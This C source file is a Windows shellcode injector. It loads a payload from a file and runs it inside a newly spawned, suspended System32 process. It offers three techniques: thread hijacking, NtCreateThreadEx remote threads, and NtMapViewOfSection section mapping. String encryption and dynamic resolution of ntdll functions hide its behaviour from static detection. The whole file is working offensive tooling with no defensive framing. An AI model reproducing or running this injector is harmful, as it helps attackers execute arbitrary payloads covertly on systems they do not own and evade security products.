#include <windows.h>
#include <stdio.h>
#include "addresshunter.h"
#include "functions.h"
#include "skCrypter.h"

#pragma warning(disable:4996)

#define STATUS_SUCCESS ((NTSTATUS)0x00000000L) // ntsubauth



VOID ParseArguments(int argc, char** argv, CHAR* processName, CHAR* shellcodeName) {
	// iterate over the arguments and parse the --process, --shellcode and --size
	for (int i = 1; i < argc; i++) 

		if (strcmp(argv[i], skCrypt("--process")) == 0) {
			if (i + 1 < argc) {
				strncpy_s(processName, MAX_PATH, argv[i + 1], _TRUNCATE);
				printf(skCrypt("[+] Process name: %s\n"), processName);
			}
			else {
				printf(skCrypt("[-] Invalid process name\n"));
				exit(1);
			}
		}
		else if (strcmp(argv[i], skCrypt("--shellcode")) == 0) {
			if (i + 1 < argc) {
				strncpy_s(shellcodeName, MAX_PATH, argv[i + 1], _TRUNCATE);
				printf(skCrypt("[+] Shellcode name: %s\n"), shellcodeName);
			}
			else {
				printf(skCrypt("[-] Invalid shellcode name\n"));
				exit(1);
			}
		}
}


BOOL ReadShellcodeFile(CHAR* shellcodeName, LPVOID* shellcode, SIZE_T* shellcodeSize) {
	HANDLE hFile = CreateFileA(shellcodeName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		printf(skCrypt("[-] Failed to open shellcode file\n"));
		return FALSE;
	}

	*shellcodeSize = GetFileSize(hFile, NULL);
	*shellcode = VirtualAlloc(NULL, *shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (*shellcode == NULL) {
		printf(skCrypt("[-] Failed to allocate memory for shellcode\n"));
		return FALSE;
	}

	DWORD bytesRead;
	if (!ReadFile(hFile, *shellcode, *shellcodeSize, &bytesRead, NULL)) {
		printf(skCrypt("[-] Failed to read shellcode file\n"));
		return FALSE;
	}

	CloseHandle(hFile);
	return TRUE;
}

BOOL InjectNtCreateThreadEx(CHAR* processName, LPVOID shellcode, SIZE_T shellcodeSize) {
	
	_NtCreateThreadEx NtCreateThreadEx = (_NtCreateThreadEx)GetSymbolAddress(GetModuleHandleA(skCrypt("ntdll.dll")), skCrypt("NtCreateThreadEx"));
	_NtAllocateVirtualMemory NtAllocateVirtualMemory = (_NtAllocateVirtualMemory)GetSymbolAddress(GetModuleHandleA(skCrypt("ntdll.dll")), skCrypt("NtAllocateVirtualMemory"));
	_NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory)GetSymbolAddress(GetModuleHandleA(skCrypt("ntdll.dll")), skCrypt("NtWriteVirtualMemory"));
	_NtProtectVirtualMemory NtProtectVirtualMemory = (_NtProtectVirtualMemory)GetSymbolAddress(GetModuleHandleA(skCrypt("ntdll.dll")), skCrypt("NtProtectVirtualMemory"));
	_NtResumeThread NtResumeThread = (_NtResumeThread)GetSymbolAddress(GetModuleHandleA(skCrypt("ntdll.dll")), skCrypt("NtResumeThread"));
	_NtWaitForSingleObject NtWaitForSingleObject = (_NtWaitForSingleObject)GetSymbolAddress(GetModuleHandleA(skCrypt("ntdll.dll")), skCrypt("NtWaitForSingleObject"));

	NTSTATUS status = STATUS_SUCCESS;
	HANDLE hReadPipe, hWritePipe;
	SECURITY_ATTRIBUTES saAttr;

	// Set the bInheritHandle flag so pipe handles are inherited.
	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	saAttr.bInheritHandle = TRUE;
	saAttr.lpSecurityDescriptor = NULL;

	if(!CreatePipe(&hReadPipe, &hWritePipe, &saAttr, 0)) {
		printf(skCrypt("[-] Failed to create pipe\n"));
		return FALSE;
	}

	if(!SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0)) {
		printf(skCrypt("[-] Failed to set handle information\n"));
		return FALSE;
	}

	printf(skCrypt("[+] Pipe created successfully\n"));

	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	OBJECT_ATTRIBUTES oa = {sizeof(oa)};

	ZeroMemory(&si, sizeof(si));

	si.cb = sizeof(si);
	si.hStdError = hWritePipe;
	si.hStdOutput = hWritePipe;
	si.dwFlags |= STARTF_USESTDHANDLES;
	
	ZeroMemory(&pi, sizeof(pi));

	LPVOID remoteBuffer = NULL;



	char processPath[MAX_PATH];
	snprintf(processPath, sizeof(processPath), skCrypt("C:\\Windows\\System32\\%s"), processName);

	if (!CreateProcessA(processPath, NULL, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, (LPSTARTUPINFOA)&si, &pi)) {
		printf(skCrypt("[-] Failed to create process\n"));
		CloseHandle(hReadPipe);
		CloseHandle(hWritePipe);

		return FALSE;
	}

	printf(skCrypt("[+] Process created successfully\n"));

	// NtAllocateVirutalMemory
	status = NtAllocateVirtualMemory(pi.hProcess, &remoteBuffer, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (status != STATUS_SUCCESS) {
		printf(skCrypt("[-] Failed to allocate memory in remote process\n"));
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		CloseHandle(hReadPipe);
		CloseHandle(hWritePipe);

		return FALSE;
	}
	printf(skCrypt("[+] Memory allocated successfully\n"));

	DWORD oldProtect;
	status = NtProtectVirtualMemory(pi.hProcess, &remoteBuffer, (PULONG) & shellcodeSize, PAGE_EXECUTE_READWRITE, &oldProtect);
	if (status != STATUS_SUCCESS) {
		printf(skCrypt("[-] Failed to change memory protection\n"));
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		CloseHandle(hReadPipe);
		CloseHandle(hWritePipe);

		return FALSE;
	}
	printf(skCrypt("[+] Memory protection changed successfully\n"));

	status = NtWriteVirtualMemory(pi.hProcess, remoteBuffer, shellcode, shellcodeSize, NULL);
	if (status != STATUS_SUCCESS) {
		printf(skCrypt("[-] Failed to write shellcode to remote process\n"));
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		CloseHandle(hReadPipe);
		CloseHandle(hWritePipe);

		return FALSE;
	}
	printf(skCrypt("[+] Shellcode written successfully\n"));
	
	HANDLE hThread = NULL;

	status = NtCreateThreadEx(
		&hThread,
		THREAD_ALL_ACCESS,
		&oa, 
		pi.hProcess,
		(LPTHREAD_START_ROUTINE)remoteBuffer,
		remoteBuffer,
		FALSE,
		NULL,
		NULL,
		NULL,
		NULL
	);
	if (status != STATUS_SUCCESS) {
		printf(skCrypt("[-] Failed to create remote thread\n"));
		printf(skCrypt("[-] Error code: %x\n"), status);
		printf(skCrypt("[-] Last Error: %d\n"), GetLastError());
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		CloseHandle(hReadPipe);
		CloseHandle(hWritePipe);

		return FALSE;
	}
	printf(skCrypt("[+] Remote thread created successfully\n"));

	status = NtResumeThread(hThread, NULL);
	if (status != STATUS_SUCCESS) {
		printf(skCrypt("[-] Failed to resume thread\n"));
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		CloseHandle(hReadPipe);
		CloseHandle(hWritePipe);
		CloseHandle(hThread);

		return FALSE;
	}
	printf(skCrypt("[+] Thread resumed successfully\n"));

	if(hThread != NULL) {
		LARGE_INTEGER timeout;
		timeout.QuadPart = INFINITE;

		status = NtWaitForSingleObject(hThread, FALSE, NULL);

		printf(skCrypt("[+] Thread finished successfully\n"));
		printf(skCrypt("[+] Shellcode executed successfully\n"));

		CloseHandle(hWritePipe);

		DWORD dwRead;
		CHAR chBuf[MAX_PATH];
		BOOL bSuccess = FALSE;
		HANDLE hParentStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
		CHAR *output = (CHAR*)malloc(1);
		if (output == NULL) {
			printf(skCrypt("[-] Failed to allocate memory\n"));
			return FALSE;
		}
		output[0] = '\0';

		for (;;) {
			bSuccess = ReadFile(hReadPipe, chBuf, MAX_PATH - 1, &dwRead, NULL);
			if (!bSuccess || dwRead == 0) break;
			chBuf[dwRead] = '\0';
			CHAR *new_output = (CHAR*)realloc(output, strlen(output) + dwRead + 2);
			if (new_output == NULL) {
				printf(skCrypt("[-] Failed to allocate memory\n"));
				free(output);
				return FALSE;
			}
			output = new_output;
			strncat(output, chBuf, dwRead);
		}
		output[strlen(output)] = '\0';
		printf(skCrypt("[+] Shellcode Output:\n%s\n"), output);
		free(output);
	}

	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	CloseHandle(hThread);
	CloseHandle(hReadPipe);
	CloseHandle(hWritePipe);

	return TRUE;

}


BOOL InjectThreadHijacking(CHAR* processName, LPVOID shellcode, SIZE_T shellcodeSize) {
	
	_NtAllocateVirtualMemory NtAllocateVirtualMemory = (_NtAllocateVirtualMemory)GetSymbolAddress(GetModuleHandleA(skCrypt("ntdll.dll")), skCrypt("NtAllocateVirtualMemory"));
	_NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory)GetSymbolAddress(GetModuleHandleA(skCrypt("ntdll.dll")), skCrypt("NtWriteVirtualMemory"));
	_NtProtectVirtualMemory NtProtectVirtualMemory = (_NtProtectVirtualMemory)GetSymbolAddress(GetModuleHandleA(skCrypt("ntdll.dll")), skCrypt("NtProtectVirtualMemory"));
	_NtResumeThread NtResumeThread = (_NtResumeThread)GetSymbolAddress(GetModuleHandleA(skCrypt("ntdll.dll")), skCrypt("NtResumeThread"));
	_NtWaitForSingleObject NtWaitForSingleObject = (_NtWaitForSingleObject)GetSymbolAddress(GetModuleHandleA(skCrypt("ntdll.dll")), skCrypt("NtWaitForSingleObject"));
	_NtGetContextThread NtGetContextThread = (_NtGetContextThread)GetSymbolAddress(GetModuleHandleA(skCrypt("ntdll.dll")), skCrypt("NtGetContextThread"));
	_NtSetContextThread NtSetContextThread = (_NtSetContextThread)GetSymbolAddress(GetModuleHandleA(skCrypt("ntdll.dll")), skCrypt("NtSetContextThread"));

	NTSTATUS status = STATUS_SUCCESS;
	HANDLE hReadPipe, hWritePipe;
	SECURITY_ATTRIBUTES saAttr;

	// Set the bInheritHandle flag so pipe handles are inherited.
	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	saAttr.bInheritHandle = TRUE;
	saAttr.lpSecurityDescriptor = NULL;

	if(!CreatePipe(&hReadPipe, &hWritePipe, &saAttr, 0)) {
		printf(skCrypt("[-] Failed to create pipe\n"));
		return FALSE;
	}

	if(!SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0)) {
		printf(skCrypt("[-] Failed to set handle information\n"));
		return FALSE;
	}

	printf(skCrypt("[+] Pipe created successfully\n"));

	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	OBJECT_ATTRIBUTES oa = {sizeof(oa)};

	ZeroMemory(&si, sizeof(si));

	si.cb = sizeof(si);
	si.hStdError = hWritePipe;
	si.hStdOutput = hWritePipe;
	si.dwFlags |= STARTF_USESTDHANDLES;
	
	ZeroMemory(&pi, sizeof(pi));

	LPVOID remoteBuffer = NULL;

	char processPath[MAX_PATH];
	snprintf(processPath, sizeof(processPath), skCrypt("C:\\Windows\\System32\\%s"), processName);

	if (!CreateProcessA(processPath, NULL, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, (LPSTARTUPINFOA)&si, &pi)) {
		printf(skCrypt("[-] Failed to create process\n"));
		CloseHandle(hReadPipe);
		CloseHandle(hWritePipe);

		return FALSE;
	}

	printf(skCrypt("[+] Process created successfully\n"));

	// NtAllocateVirutalMemory
	status = NtAllocateVirtualMemory(pi.hProcess, &remoteBuffer, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (status != STATUS_SUCCESS) {
		printf(skCrypt("[-] Failed to allocate memory in remote process\n"));
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		CloseHandle(hReadPipe);
		CloseHandle(hWritePipe);

		return FALSE;
	}
	printf(skCrypt("[+] Memory allocated successfully\n"));

	DWORD oldProtect;
	status = NtProtectVirtualMemory(pi.hProcess, &remoteBuffer, (PULONG) & shellcodeSize, PAGE_EXECUTE_READWRITE, &oldProtect);
	if (status != STATUS_SUCCESS) {
		printf(skCrypt("[-] Failed to change memory protection\n"));
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		CloseHandle(hReadPipe);
		CloseHandle(hWritePipe);

		return FALSE;
	}
	printf(skCrypt("[+] Memory protection changed successfully\n"));

	status = NtWriteVirtualMemory(pi.hProcess, remoteBuffer, shellcode, shellcodeSize, NULL);
	if (status != STATUS_SUCCESS) {
		printf(skCrypt("[-] Failed to write shellcode to remote process\n"));
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		CloseHandle(hReadPipe);
		CloseHandle(hWritePipe);

		return FALSE;
	}
	printf(skCrypt("[+] Shellcode written successfully\n"));

	CONTEXT ctx;
	ctx.ContextFlags = CONTEXT_FULL;
	status = NtGetContextThread(pi.hThread, &ctx);
	if (status != STATUS_SUCCESS) {
		printf(skCrypt("[-] Failed to get thread context\n"));
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		CloseHandle(hReadPipe);
		CloseHandle(hWritePipe);

		return FALSE;
	}
	printf(skCrypt("[+] Thread context retrieved successfully\n"));
	ctx.Rip = (DWORD64)remoteBuffer;
	status = NtSetContextThread(pi.hThread, &ctx);
	if (status != STATUS_SUCCESS) {
		printf(skCrypt("[-] Failed to set thread context\n"));
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		CloseHandle(hReadPipe);
		CloseHandle(hWritePipe);

		return FALSE;
	}
	printf(skCrypt("[+] Thread context set successfully\n"));
	status = NtResumeThread(pi.hThread, NULL);
	if (status != STATUS_SUCCESS) {
		printf(skCrypt("[-] Failed to resume thread\n"));
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		CloseHandle(hReadPipe);
		CloseHandle(hWritePipe);

		return FALSE;
	}
	printf(skCrypt("[+] Thread resumed successfully\n"));

	if (pi.hThread != NULL) {
		LARGE_INTEGER timeout;
		timeout.QuadPart = INFINITE;

		status = NtWaitForSingleObject(pi.hThread, FALSE, &timeout);
		
		printf(skCrypt("[+] Thread finished successfully\n"));
		printf(skCrypt("[+] Shellcode executed successfully\n"));

		CloseHandle(hWritePipe);

		DWORD dwRead;
		CHAR chBuf[MAX_PATH];
		BOOL bSuccess = FALSE;
		HANDLE hParentStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
		CHAR *output = (CHAR*)malloc(1);
		if (output == NULL) {
			printf(skCrypt("[-] Failed to allocate memory\n"));
			return FALSE;
		}
		output[0] = '\0';

		for (;;) {
			bSuccess = ReadFile(hReadPipe, chBuf, MAX_PATH - 1, &dwRead, NULL);
			if (!bSuccess || dwRead == 0) break;
			chBuf[dwRead] = '\0';
			CHAR *new_output = (CHAR*)realloc(output, strlen(output) + dwRead + 2);
			if (new_output == NULL) {
				printf(skCrypt("[-] Failed to allocate memory\n"));
				free(output);
				return FALSE;
			}
			output = new_output;
			strncat(output, chBuf, dwRead);
		}
		output[strlen(output)] = '\0';
		printf(skCrypt("[+] Shellcode Output:\n%s\n"), output);
		free(output);
	} 

	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	CloseHandle(hReadPipe);
	CloseHandle(hWritePipe);

	return TRUE;

}


BOOL InjectNtMapViewOfSection(CHAR* processName, LPVOID shellcode, SIZE_T shellcodeSize) {
	
	_NtMapViewOfSection NtMapViewOfSection = (_NtMapViewOfSection)GetSymbolAddress(GetModuleHandleA(skCrypt("ntdll.dll")), skCrypt("NtMapViewOfSection"));
	_NtCreateSection NtCreateSection = (_NtCreateSection)GetSymbolAddress(GetModuleHandleA(skCrypt("ntdll.dll")), skCrypt("NtCreateSection"));
	_NtUnmapViewOfSection NtUnmapViewOfSection = (_NtUnmapViewOfSection)GetSymbolAddress(GetModuleHandleA(skCrypt("ntdll.dll")), skCrypt("NtUnmapViewOfSection"));
	_NtGetContextThread NtGetContextThread = (_NtGetContextThread)GetSymbolAddress(GetModuleHandleA(skCrypt("ntdll.dll")), skCrypt("NtGetContextThread"));
	_NtSetContextThread NtSetContextThread = (_NtSetContextThread)GetSymbolAddress(GetModuleHandleA(skCrypt("ntdll.dll")), skCrypt("NtSetContextThread"));
	_NtResumeThread NtResumeThread = (_NtResumeThread)GetSymbolAddress(GetModuleHandleA(skCrypt("ntdll.dll")), skCrypt("NtResumeThread"));
	_NtWaitForSingleObject NtWaitForSingleObject = (_NtWaitForSingleObject)GetSymbolAddress(GetModuleHandleA(skCrypt("ntdll.dll")), skCrypt("NtWaitForSingleObject"));

	NTSTATUS status = STATUS_SUCCESS;
	HANDLE hReadPipe, hWritePipe;
	SECURITY_ATTRIBUTES saAttr;

	// Set the bInheritHandle flag so pipe handles are inherited.
	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	saAttr.bInheritHandle = TRUE;
	saAttr.lpSecurityDescriptor = NULL;

	if(!CreatePipe(&hReadPipe, &hWritePipe, &saAttr, 0)) {
		printf(skCrypt("[-] Failed to create pipe\n"));
		return FALSE;
	}

	if(!SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0)) {
		printf(skCrypt("[-] Failed to set handle information\n"));
		return FALSE;
	}

	printf(skCrypt("[+] Pipe created successfully\n"));

	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	OBJECT_ATTRIBUTES oa = {sizeof(oa)};

	ZeroMemory(&si, sizeof(si));

	si.cb = sizeof(si);
	si.hStdError = hWritePipe;
	si.hStdOutput = hWritePipe;
	si.dwFlags |= STARTF_USESTDHANDLES;
	
	ZeroMemory(&pi, sizeof(pi));
	char processPath[MAX_PATH];
	
	snprintf(processPath, sizeof(processPath), skCrypt("C:\\Windows\\System32\\%s"), processName);
	
	if (!CreateProcessA(processPath, NULL, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, (LPSTARTUPINFOA)&si, &pi)) {
		printf(skCrypt("[-] Failed to create process\n"));
		CloseHandle(hReadPipe);
		CloseHandle(hWritePipe);

		return FALSE;
	}

	printf(skCrypt("[+] Process created successfully\n"));
	HANDLE hSection = NULL;
	LARGE_INTEGER sectionSize = { shellcodeSize };
	status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
	if (status != STATUS_SUCCESS) {
		printf(skCrypt("[-] Failed to create section\n"));
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		CloseHandle(hReadPipe);
		CloseHandle(hWritePipe);

		return FALSE;

	}
	printf(skCrypt("[+] Section created successfully\n"));
	PVOID localBuffer = NULL;
	SIZE_T viewSize = 0;
	status = NtMapViewOfSection(
		hSection,
		GetCurrentProcess(),
		&localBuffer,
		0,
		shellcodeSize,
		NULL,
		&viewSize,
		ViewUnmap,
		0,
		PAGE_EXECUTE_READWRITE
	);

	if (status != STATUS_SUCCESS) {
		printf(skCrypt("[-] Failed to map section\n"));
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		CloseHandle(hReadPipe);
		CloseHandle(hWritePipe);

		return FALSE;

	}
	printf(skCrypt("[+] Section mapped successfully\n"));
	CopyMemoryEx(localBuffer, shellcode, shellcodeSize);

	PVOID remoteBuffer = NULL;
	status = NtMapViewOfSection(
		hSection,
		pi.hProcess,
		&remoteBuffer,
		0,
		shellcodeSize,
		NULL,
		&viewSize,
		ViewUnmap,
		0,
		PAGE_EXECUTE_READWRITE
	);

	if (status != STATUS_SUCCESS) {
		printf(skCrypt("[-] Failed to map section\n"));
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		CloseHandle(hReadPipe);
		CloseHandle(hWritePipe);

		return FALSE;

	}
	printf(skCrypt("[+] Section mapped successfully\n"));
	CONTEXT ctx;
	ctx.ContextFlags = CONTEXT_FULL;
	
	NtGetContextThread(pi.hThread, &ctx);
	ctx.Rip = (DWORD64)remoteBuffer;
	NtSetContextThread(pi.hThread, &ctx);

	status = NtResumeThread(pi.hThread, NULL);
	if (status != STATUS_SUCCESS) {
		printf(skCrypt("[-] Failed to resume thread\n"));
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		CloseHandle(hReadPipe);
		CloseHandle(hWritePipe);

		return FALSE;
	}

	printf(skCrypt("[+] Thread resumed successfully\n"));

	if(pi.hThread != NULL) {
		LARGE_INTEGER timeout;
		timeout.QuadPart = INFINITE;

		status = NtWaitForSingleObject(pi.hThread, FALSE, &timeout);

		printf(skCrypt("[+] Thread finished successfully\n"));
		printf(skCrypt("[+] Shellcode executed successfully\n"));

		CloseHandle(hWritePipe);

		DWORD dwRead;
		CHAR chBuf[MAX_PATH];
		BOOL bSuccess = FALSE;
		HANDLE hParentStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
		CHAR *output = (CHAR*)malloc(1);
		if (output == NULL) {
			printf(skCrypt("[-] Failed to allocate memory\n"));
			return FALSE;
		}
		output[0] = '\0';

		for (;;) {
			bSuccess = ReadFile(hReadPipe, chBuf, MAX_PATH - 1, &dwRead, NULL);
			if (!bSuccess || dwRead == 0) break;
			chBuf[dwRead] = '\0';
			CHAR *new_output = (CHAR*)realloc(output, strlen(output) + dwRead + 2);
			if (new_output == NULL) {
				printf(skCrypt("[-] Failed to allocate memory\n"));
				free(output);
				return FALSE;
			}
			output = new_output;
			strncat(output, chBuf, dwRead);
		}
		output[strlen(output)] = '\0';
		printf(skCrypt("[+] Shellcode Output:\n%s\n"), output);
		free(output);
	
	}

	status = NtUnmapViewOfSection(GetCurrentProcess(), localBuffer);

	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	CloseHandle(hReadPipe);
	CloseHandle(hWritePipe);
	return TRUE;
	
}

VOID PrintUsage() {
	printf(skCrypt("Usage: interactive-execute-shellcode.exe --technique <technique> --process <process> --shellcode <shellcode>\n"));
	printf(skCrypt("Techniques:\n"));
	printf(skCrypt("\tThreadHijacking\n"));
	printf(skCrypt("\tNtCreateThreadEx\n"));
	printf(skCrypt("\tNtMapViewOfSection\n"));

}


int main(int argc, char** argv) {
	CHAR processName[MAX_PATH];
	CHAR shellcodeName[MAX_PATH];
	SIZE_T shellcodeSize;
	LPVOID shellcode = NULL;

	// iterate over the arguments and parse the --technique execute the shellcode
	if (argc < 2) {
		PrintUsage();
		return 1;
	}
	
	for (int i = 1; i < argc; i++) {
		if (strcmp(argv[i], skCrypt("--technique")) == 0) {
			if (i + 1 < argc) {

				// Thread Hijacking
				if (strcmp(argv[i + 1], skCrypt("ThreadHijacking")) == 0) {
					// Thread Hijacking
					ParseArguments(argc, argv, processName, shellcodeName);
					if (!ReadShellcodeFile(shellcodeName, &shellcode, &shellcodeSize)) {
						return 1;
					}
					
					if (!InjectThreadHijacking(processName, shellcode, shellcodeSize)) {
						return 1;
					}
					return 0;

				}

				// NtCreateThreadEx
				else if (strcmp(argv[i + 1], skCrypt("NtCreateThreadEx")) == 0) {
					// NtCreateThreadEx
					printf(skCrypt("[+] NtCreateThreadEx Has been chosen!\n"));
					ParseArguments(argc, argv, processName, shellcodeName);
					if (!ReadShellcodeFile(shellcodeName, &shellcode, &shellcodeSize)) {
						return 1;
					}
					if (!InjectNtCreateThreadEx(processName, shellcode, shellcodeSize)) {
						return 1;
					}
					return 0;
					
				}

				// NtMapViewOfSection
				else if (strcmp(argv[i + 1], skCrypt("NtMapViewOfSection")) == 0) {
					// NtMapViewOfSection
					ParseArguments(argc, argv, processName, shellcodeName);
					if (!ReadShellcodeFile(shellcodeName, &shellcode, &shellcodeSize)) {
						return 1;
					}
					if(!InjectNtMapViewOfSection(processName, shellcode, shellcodeSize)) {
						return 1;
					}
					return 0;

				}
				else {
					printf(skCrypt("[-] Invalid technique\n"));
					PrintUsage();
					return 1;
			}


			} else {
				printf(skCrypt("[-] Invalid technique\n"));
				PrintUsage();
				return 1;
			}

		}

	}
	printf(skCrypt("[-] Invalid technique\n"));
	PrintUsage();

	return 0;
}